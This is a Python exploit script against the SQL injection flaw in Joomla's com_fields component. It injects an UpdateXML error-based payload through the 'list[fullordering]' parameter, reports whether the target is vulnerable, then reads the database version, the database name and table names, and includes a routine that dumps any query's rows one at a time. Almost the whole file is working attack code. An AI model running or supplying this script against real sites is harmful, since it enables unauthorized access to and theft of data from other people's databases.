import requests
import math


scheme = 'http'
host = '' # TODO
port = '80'
uri = 'index.php'
token = '' # TODO
debug=True
queryParamsScheme = {
    "option": "com_fields",
    "view": "fields",
    "layout": "modal",
    "list[fullordering]": "sqli",
    token: "1"
}


def getBaseUrl(scheme, host, port, uri):

    return "{0}://{1}:{2}/{3}".format(scheme, host, port, uri)

def debug(message):
    if debug:
        print("------> {0}".format(message))

def display(message):
    print(">> {0}".format(message))

def encapsulateSqli(rawSqli):
    return "UpdateXML(2, concat(0x3a, ({0}), 0x3a), 1)".format(rawSqli)


def buildSqliQueryParams(sqli):
    cloned = dict(queryParamsScheme)
    cloned["list[fullordering]"] = encapsulateSqli(sqli)

    return cloned

def doHttpRequest(url, queryParameters):
    response = requests.get(url, params=queryParameters)

    start_index = response.text.find("<title>") + len("<title>")
    end_index = response.text.find("</title>", start_index)

    # Extract the title content
    title = response.text[start_index:end_index].strip()
    debug(title)

    return title


def extractBetween(rawString, start, end = None):
    start_index = rawString.find(start) + len(start)

    if end is not None:
        end_index = rawString.find(end, start_index)
        return rawString[start_index:end_index]

    return rawString[start_index:]


def extractValueFromTitle(title):
    return extractBetween(title, "#039;:", ":&#039")



def detectIfVulnerable(baseUrl):
    basicSqli = "40 + 2"
    result = doHttpRequest(baseUrl, buildSqliQueryParams(basicSqli))

    if "42" in result:
        display("{0} is vulnerable to SQLI".format(baseUrl))

        return True

    display("{0} is NOT vulnerable to SQLI".format(baseUrl))

    return False

def getDatabaseVersion(baseUrl):
    sqli = "SELECT VERSION()"
    extractedVersion = extractValueFromTitle(doHttpRequest(baseUrl, buildSqliQueryParams(sqli)))
    display("Version detected : {0}".format(extractedVersion))

def extractQueryColumns(sqlRequest):
    return extractBetween(sqlRequest, "SELECT", "FROM")

def extractQueryFromPart(sqlRequest):
    return extractBetween(sqlRequest, "FROM")


def getNbRows(requestFromClause):
    sqli = "SELECT COUNT(*) FROM {0}".format(requestFromClause)
    countResult = extractValueFromTitle(doHttpRequest(baseUrl, buildSqliQueryParams(sqli)))

    return int(countResult)

def centerText(text, width):
    paddingEnd = int((math.floor(width/2) - 1) - ((len(text)+1)/2))
    paddingStart = int(math.floor(width/2) - (len(text)/2))
    return "|" + " " * paddingStart + text + " " * paddingEnd + "|"
def printResultColumn(rows, columnName, width):
    print("-" * width)
    print(centerText(columnName, width))
    print("-" * width)
    for row in rows:
        print(centerText(row, width))
    print("-" * width)


def queryAllRow(baseUrl, sqlRequest):
    debug("Going to query all row for {0}".format(sqlRequest))
    columns = extractQueryColumns(sqlRequest).strip()
    fromClause = extractQueryFromPart(sqlRequest)
    debug("Extracted columns from SQL request : {0}".format(columns))
    debug("Extracted columns FROM CLAUSE form SQL request : {0}".format(fromClause))
    nbRowToQuery = getNbRows(fromClause)
    display("{0} row(s) detected for the SQL request : {1}".format(str(nbRowToQuery), sqlRequest))

    rows = []
    for i in range(nbRowToQuery):
        rowSqli = sqlRequest + " LIMIT 1 OFFSET {0}".format(str(i))
        rows.append(extractValueFromTitle(doHttpRequest(baseUrl, buildSqliQueryParams(rowSqli))))

    display("Result for SQL query : {0}".format(sqlRequest))
    printResultColumn(rows, columns, 64)


def showTables(baseUrl, database):
    sqli = "SELECT table_name FROM information_schema.tables WHERE table_schema = CONVERT(UNHEX(\"{0}\") USING utf8) LIMIT 1".format(database.encode('utf-8').hex())
    debug(sqli)
    #queryAllRow(baseUrl, sqli)
    extractValueFromTitle(doHttpRequest(baseUrl, buildSqliQueryParams(sqli)))

def showDatabase(baseUrl):
    sqli = "DATABASE()"
    database = extractValueFromTitle(doHttpRequest(baseUrl, buildSqliQueryParams(sqli)))

    display("Current database : {0}".format(database))

    return database

def doExploit(baseUrl):
    if(detectIfVulnerable(baseUrl)):
        getDatabaseVersion(baseUrl)
        database = showDatabase(baseUrl)
        showTables(baseUrl, database)



baseUrl = getBaseUrl(scheme, host, port, uri)

doExploit(baseUrl)


#SELECT table_name FROM information_schema.tables WHERE table_schema = CONVERT(UNHEX(hex("joomla")) USING utf8)